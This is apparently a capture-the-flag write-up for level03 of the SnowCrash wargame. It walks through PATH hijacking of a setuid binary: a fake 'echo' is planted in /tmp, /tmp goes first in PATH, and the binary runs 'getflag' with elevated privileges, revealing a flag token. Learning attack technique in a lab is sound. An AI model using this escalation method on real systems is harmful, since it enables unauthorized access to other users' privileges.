On the level 3 we can do a basic command "ls -l".

	level03@SnowCrash:~$ ls -l
	total 12
	-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

We see that the level03 file is owned by flag03, it means that the user level03
can execute it as flag03.
Now we need to find out what does this program.

	level03@SnowCrash:~$ ./level03 
	Exploit me

It seems to just print "Exploit me".
We can see more details by using the command strings on the executable.

	level03@SnowCrash:~$ strings level03 | grep "Exploit me"
	/usr/bin/env echo Exploit me

We can see that the program use "/usr/bin/env echo" to print "Exploit me"
Here the use of env ensures that you're using the external 'echo' binary if one exists.

So we need to create an echo file that will do a 'getflag' command instead of using the classic echo command.
We are going to do it in the "/tmp" directory because we have no permission for other directories.

	level03@SnowCrash:~$ cd /tmp
	level03@SnowCrash:/tmp$ echo "getflag" > echo
	level03@SnowCrash:/tmp$ chmod 777 echo
	level03@SnowCrash:/tmp$ cd

Now we need to add the /tmp directory to the $PATH, where the program is going to look for echo.

	level03@SnowCrash:~$ echo $PATH
	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

	level03@SnowCrash:~$ export PATH=/tmp:$PATH

	level03@SnowCrash:~$ echo $PATH
	/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

We have added the /tmp directory in front of the path, so it's going to search first in the tmp directory.
Fortunatly, thats the echo that we just created that is going to be found first.

Now we can execute the level03 program and we should see the flag appear.

	level03@SnowCrash:~$ ./level03 
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
